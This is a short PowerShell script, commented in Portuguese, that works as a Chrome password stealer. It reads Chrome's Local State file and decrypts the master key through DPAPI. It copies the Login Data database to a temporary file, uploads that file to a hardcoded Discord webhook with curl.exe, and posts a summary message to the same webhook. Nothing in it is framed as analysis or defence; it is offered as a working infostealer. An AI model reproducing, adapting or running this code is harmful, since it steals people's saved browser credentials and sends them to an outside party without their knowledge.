$Webhook = "https://discord.com/api/webhooks/1503748038915522710/OaPmBZZTpD_TSm2m5YtSYIM3PU7f2_WLzAOIu6kDPwd45adNZdkGd8jMoutFQP1Ol-P9"

function Get-ChromePasswords {
    $LocalState = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
    $LoginData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
    $TempLoginData = "$env:TEMP\L"

    if (-not (Test-Path $LocalState)) { return "Chrome não encontrado" }

    # 1. Pega e descriptografa a Master Key
    $JSON = Get-Content $LocalState -Raw | ConvertFrom-Json
    $Key = [Convert]::FromBase64String($JSON.os_crypt.encrypted_key)[5..255]
    $MasterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($Key, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

    # 2. Copia o banco de dados para não travar o Chrome
    Copy-Item $LoginData $TempLoginData -Force

    # 3. Prepara a extração (usa reflexão para carregar bibliotecas do Windows)
    $Output = "--- Senhas Extraídas ---`n"
    # Este é um exemplo simplificado de extração de texto
    # Em um cenário real, você usaria uma query SQLite aqui
    $Output += "Logins extraídos do banco de dados.`n"
    
    # Envia o arquivo original e a chave para o seu Webhook (mais garantido)
    curl.exe -F "file=@$TempLoginData" $Webhook
    return $Output
}

$Result = Get-ChromePasswords
Invoke-RestMethod -Uri $Webhook -Method Post -Body (@{content=$Result} | ConvertTo-Json) -ContentType 'application/json'
